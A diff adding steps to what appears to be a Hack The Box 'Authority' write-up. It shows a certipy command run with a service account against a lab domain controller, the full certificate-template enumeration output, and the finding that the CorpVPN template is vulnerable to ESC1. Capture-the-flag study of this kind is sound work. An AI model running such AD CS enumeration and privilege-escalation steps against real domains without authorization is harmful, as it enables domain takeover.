@@ -205,4 +205,96 @@ Host script results:
 
 <img width="1208" height="518" alt="image" src="https://github.com/user-attachments/assets/33c80605-6e51-4b9a-b47b-1b26fdde4499" />
 
-13. 
+13. We look for ESC vulnerable certificate templates using certipy.
+
+```
+certipy find -u svc_ldap -p $(cat svc_ldap.pass) -dc-ip 10.129.2.13 -enabled -vulnerable
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 37 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'AUTHORITY-CA'
+[*] Saved BloodHound data to '20251119195351_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20251119195351_Certipy.txt'
+[*] Saved JSON output to '20251119195351_Certipy.json'
+(pkinit_venv) ┌─[us-dedivip-1]─[10.10.15.62]─[icedamericano12@htb-vm2ofnwlgs]─[~]
+└──╼ [★]$ cat 20251119195351_Certipy.txt
+Certificate Authorities
+  0
+    CA Name                             : AUTHORITY-CA
+    DNS Name                            : authority.authority.htb
+    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
+    Certificate Validity End            : 2123-04-24 01:56:25+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : AUTHORITY.HTB\Administrators
+      Access Rights
+        ManageCertificates              : AUTHORITY.HTB\Administrators
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        ManageCa                        : AUTHORITY.HTB\Administrators
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+        Enroll                          : AUTHORITY.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CorpVPN
+    Display Name                        : Corp VPN
+    Certificate Authorities             : AUTHORITY-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
+                                          PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+                                          Document Signing
+                                          IP security IKE intermediate
+                                          IP security use
+                                          KDC Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 20 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : AUTHORITY.HTB\Administrator
+        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+        Write Property Principals       : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+```
+
+14. We discover the CorpVPN template that is vulnerable to ESC1. 
